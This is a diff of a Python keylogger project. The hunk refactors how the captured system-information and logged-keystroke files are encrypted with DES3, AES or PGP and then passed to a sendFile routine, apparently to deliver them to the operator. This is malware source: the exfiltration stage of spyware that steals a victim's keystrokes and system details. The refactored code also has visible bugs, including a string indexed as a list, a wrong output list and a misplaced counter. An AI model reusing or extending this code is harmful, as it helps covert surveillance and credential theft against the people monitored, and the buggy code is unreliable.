@@ -193,103 +193,82 @@ while currentTime < endTime:
 # PGP encryption
 
 # encrypt files
-def des3_encrypt(key):
+
+def encryptions(key, name, email, system, keylogger):
     systemfiles_to_encrypt = [extendedPath + systemInfo]
     keyloggerfiles_to_encrypt = [extendedPath + loggedKeys]
     systemencrypted_file_names = [extendedPath + systemInfoEncrypted]
     keylogger_encrypt_filename = [extendedPath + loggedKeysEncrypted]
     count = 0
-    for encryptingFile in systemfiles_to_encrypt:
-        with open(systemfiles_to_encrypt[count], 'rb') as f:
-            data = f.read()
-            iv = Random.new().read(DES3.block_size)  # DES3.block_size==8
-            cipher_encrypt = DES3.new(key, DES3.MODE_OFB, iv)
-            pad_len = 8 - len(data) % 8
-            # length of padding
-            padding = chr(pad_len) * pad_len
-            # PKCS5 padding content
-            data += padding.encode('utf-8')
-            encrypted_text = cipher_encrypt.encrypt(data)
-            with open(systemencrypted_file_names[count], 'wb') as f:
-                f.write(encrypted_text)
+    if system:
+        for encryptingFile in systemfiles_to_encrypt:
+            if name == "DES3":
+                systemencrypted_file_names[count] = des3_encrypt(key, encryptingFile)
+            if name == "AES":
+                systemencrypted_file_names[count] = encrypt_aes(key, encryptingFile)
+            if name == "PGP":
+                systemencrypted_file_names[count] = encrypt_gnupg(email, key, encryptingFile,
+                                                                  keylogger_encrypt_filename[count])
             sendFile(systemencrypted_file_names[count], True)
-            count = count + 1
+            count += 1
     count = 0
-    for encryptingFile in keyloggerfiles_to_encrypt:
-        with open(keyloggerfiles_to_encrypt[count], 'rb') as f:
-            data = f.read()
-            iv = Random.new().read(DES3.block_size)  # DES3.block_size==8
-            cipher_encrypt = DES3.new(key, DES3.MODE_OFB, iv)
-            pad_len = 8 - len(data) % 8
-            # length of padding
-            padding = chr(pad_len) * pad_len
-            # PKCS5 padding content
-            data += padding.encode('utf-8')
-            encrypted_text = cipher_encrypt.encrypt(data)
-            with open(keylogger_encrypt_filename[count], 'wb') as f:
-                f.write(encrypted_text)
-            sendFile(keylogger_encrypt_filename[count], False)
-            count = count + 1
-    return key
+    if keylogger:
+        for encryptingFile in keyloggerfiles_to_encrypt:
+            if name == "DES3":
+                systemencrypted_file_names[count] = des3_encrypt(key, encryptingFile)
+            if name == "AES":
+                systemencrypted_file_names[count] = encrypt_aes(key, encryptingFile)
+            if name == "PGP":
+                systemencrypted_file_names[count] = encrypt_gnupg(email, key, encryptingFile,
+                                                                  keylogger_encrypt_filename[count])
+            sendFile(keylogger_encrypt_filename[count], True)
+        count += 1
 
 
-def encrypt_aes(key):
+### ENCRYPT FILES HERE ###
+# PGP encryption
+
+# encrypt files
+def des3_encrypt(key, filelist_encrypt):
+    count = 0
+    with open(filelist_encrypt[count], 'rb') as f:
+        data = f.read()
+    iv = Random.new().read(DES3.block_size)  # DES3.block_size==8
+    cipher_encrypt = DES3.new(key, DES3.MODE_OFB, iv)
+    pad_len = 8 - len(data) % 8
+    # length of padding
+    padding = chr(pad_len) * pad_len
+    # PKCS5 padding content
+    data += padding.encode('utf-8')
+    encrypted_text = cipher_encrypt.encrypt(data)
+    with open("temp.txt", 'wb') as f:
+        f.write(encrypted_text)
+    return "temp.txt"
+
+
+def encrypt_aes(key, original_file):
     # encrypt the file with the key and aes and return the encrypt text
-    systemfiles_to_encrypt = [extendedPath + systemInfo]
-    keyloggerfiles_to_encrypt = [extendedPath + loggedKeys]
-    systemencrypted_file_names = [extendedPath + systemInfoEncrypted]
-    keylogger_encrypt_filename = [extendedPath + loggedKeysEncrypted]
     count = 0
-    for encryptingFile in systemfiles_to_encrypt:
-        with open(systemfiles_to_encrypt[count], 'rb') as f:
-            data = f.read()
-            new_text = PAD(data)
-            iv = Random.new().read(BS)
-            cipher = AES.new(key, AES.MODE_CBC, iv)
-            with open(systemencrypted_file_names[count], 'wb') as f:
-                f.write(base64.b64encode(iv + cipher.encrypt(new_text)))
-            sendFile(systemencrypted_file_names[count], True)
-            count = count + 1
-    count = 0
-    for encryptingFile in keyloggerfiles_to_encrypt:
-        with open(keyloggerfiles_to_encrypt[count], 'rb') as f:
-            data = f.read()
-            new_text = PAD(data)
-            iv = Random.new().read(BS)
-            cipher = AES.new(key, AES.MODE_CBC, iv)
-            with open(keylogger_encrypt_filename[count], 'wb') as f:
-                f.write(base64.b64encode(iv + cipher.encrypt(new_text)))
-            sendFile(keylogger_encrypt_filename[count], False)
-            count = count + 1
-    return key
+    with open(original_file, 'rb') as f:
+        data = f.read()
+    new_text = PAD(data)
+    iv = Random.new().read(BS)
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    with open("tmp.txt", 'wb') as f:
+        f.write(base64.b64encode(iv + cipher.encrypt(new_text)))
+    return "tmp.txt"
 
 
-def encrypt_gnupg(email, key):
+def encrypt_gnupg(email, key, file_to_encrypt, encrypted_file):
     # encrypt file name original_file
     # output in the dir and the encrypt file that we entered
     gpg = gnupg.GPG(gnupghome='C:\\Program Files (x86)\\GnuPG\\bin',
                     gpgbinary='C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe')
-    systemfilesToEncrypt = [extendedPath + systemInfo]
-    keyloggerfilesToEncrypt = [extendedPath + loggedKeys]
-    systemencryptedFileNames = [extendedPath + systemInfoEncrypted]
-    keyloggerencryptname = [extendedPath + loggedKeysEncrypted]
-    count = 0
-    for encryptingFile in systemfilesToEncrypt:
-        with open(systemfilesToEncrypt[count], 'rb') as f:
-            status = gpg.encrypt_file(
-                f, recipients=[email],
-                output=systemencryptedFileNames[count] + '.gpg')
-            sendFile(systemencryptedFileNames[count], True)
-        count = count + 1
-    count = 0
-    for encryptingFile in keyloggerfilesToEncrypt:
-        with open(keyloggerfilesToEncrypt[count], 'rb') as f:
-            status = gpg.encrypt_file(
-                f, recipients=[email],
-                output=keyloggerencryptname[count] + '.gpg')
-            sendFile(keyloggerencryptname[count], False)
-        count = count + 1
-    return key
+    with open(file_to_encrypt, 'rb') as f:
+        status = gpg.encrypt_file(
+            f, recipients=[email],
+            output=encrypted_file + '.gpg')
+    return encrypted_file
 
 
 # Fernet Encryption - May be implemented later
